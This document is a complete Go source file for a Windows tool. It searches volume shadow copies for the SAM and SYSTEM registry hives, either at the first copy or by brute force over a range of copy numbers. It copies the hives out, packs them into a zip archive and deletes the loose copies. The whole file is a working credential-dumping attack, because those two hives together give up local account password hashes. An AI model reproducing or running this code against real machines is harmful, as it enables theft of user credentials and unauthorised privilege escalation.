package main

import (
	"archive/zip"
	"fmt"
	"io"
	"log"
	"os"
	"path"
	"runtime"
	"strconv"
)

var quickWin bool = false
var bruteForce bool = false
var maxDepth int = 15
var outputPath string = ""

func parseArgs() {
	argsWithoutProg := os.Args[1:]
	if len(argsWithoutProg) <= 0 {
		quickWin = true
		return
	}
	for i := 0; i < len(argsWithoutProg); i++ {
		if argsWithoutProg[i] == "-q" {
			quickWin = true
			bruteForce = false
		}
		if argsWithoutProg[i] == "-b" {
			bruteForce = true
			quickWin = false
		}
		if argsWithoutProg[i] == "-d" {
			if len(argsWithoutProg)-1 >= i+1 {
				conVal, errConv := strconv.Atoi(argsWithoutProg[i+1])
				if errConv != nil {
					fmt.Println("[-] the max depth for searching is invalid. Using default value")
				} else {
					maxDepth = conVal
				}
			} else {
				fmt.Println("[-] did you forget to pass in an argument for max depth?")
			}
		}
		if argsWithoutProg[i] == "-o" {
			if len(argsWithoutProg)-1 >= i+1 {
				outputPath = argsWithoutProg[i+1]
			} else {
				fmt.Println("[-] did you forget to pass in an argument for output?")
			}
		}
	}
	if !quickWin && !bruteForce {
		quickWin = true
	}
}

func scanForHiveShadow(whichDriveNumber int) int {
	if _, err := os.Stat(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SAM", whichDriveNumber)); err == nil {
		return whichDriveNumber
	}
	return 0
}

func copyHiveData(driveNumber int) bool {
	sByte, err := copy(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SAM", driveNumber), path.Join(outputPath, "SAM"))
	if err != nil {
		fmt.Println("[-] FAILED to copy SAM file")
		fmt.Print(err)
	} else {
		fmt.Println(fmt.Sprintf("[-] Copyed %d bytes from SAM into %s", sByte, path.Join(outputPath, "SAM")))
		ssByte, serr := copy(fmt.Sprintf("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d\\Windows\\System32\\config\\SYSTEM", driveNumber), path.Join(outputPath, "SYSTEM"))
		if serr != nil {
			fmt.Println("[-] FAILED to copy SYSTEM file")
		} else {
			fmt.Println(fmt.Sprintf("[-] Copyed %d bytes from SYSTEM into %s", ssByte, path.Join(outputPath, "SYSTEM")))
			return true
		}
	}
	return false
}

func copy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}

func ZipFiles(filename string, files []string) error {

	newZipFile, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	// Add files to zip
	for _, file := range files {
		if err = AddFileToZip(zipWriter, file); err != nil {
			return err
		}
	}
	return nil
}

func AddFileToZip(zipWriter *zip.Writer, filename string) error {

	fileToZip, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer fileToZip.Close()

	// Get the file information
	info, err := fileToZip.Stat()
	if err != nil {
		return err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return err
	}

	// Using FileInfoHeader() above only uses the basename of the file. If we want
	// to preserve the folder structure we can overwrite this with the full path.
	header.Name = filename

	// Change to deflate to gain better compression
	// see http://golang.org/pkg/archive/zip/#pkg-constants
	header.Method = zip.Deflate

	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return err
	}
	_, err = io.Copy(writer, fileToZip)
	return err
}


func createZipArchive() bool {
	var samPath = path.Join(outputPath, "SAM")
	var symPath = path.Join(outputPath, "SYSTEM")
	var archPath = path.Join(outputPath, "samael.zip")
	fmt.Println("[+] Creating archive")
	var files = []string {
		samPath,
		symPath,
	}

	if err := ZipFiles(archPath, files); err != nil {
		panic(err)
	}
	fmt.Println("[+] Cleanup")
	os.Remove(samPath)
	os.Remove(symPath)
	fmt.Println(fmt.Sprintf("[+] Archive available at path %s", archPath))
	return true
}

func main() {
	if runtime.GOOS == "windows" {
		// Get current path in case user does not specify one
		currentPath, err := os.Getwd()
		if err != nil {
			log.Println(err)
		}
		outputPath = currentPath

		parseArgs()

		if quickWin {
			fmt.Println("[+] running quick wins")
			if scanForHiveShadow(1) > 0 {
				fmt.Println("[+] found shadow drive 1")
				if copyHiveData(1) {
					createZipArchive()
				}
			} else {
				fmt.Println("[-] shadow drive 1 was not found, maybe try to bruteforce")
			}
		} else if bruteForce {
			fmt.Println(fmt.Sprintf("[+] running bruteforce with max depth %d", maxDepth))
			for x := 1; x <= maxDepth; x++ {
				scanResult := scanForHiveShadow(x)
				if scanResult > 0 {
					fmt.Println(fmt.Sprintf("[+] found shadow drive %d", x))
					if copyHiveData(x) {
						createZipArchive()
						break
					}
				}
			}
		} else {
			fmt.Println("[+] something something darkside")
		}
	} else {
		fmt.Println("[-] Hey what do you think you're doing here? SAM/SYSTEM on linux???")
	}
}
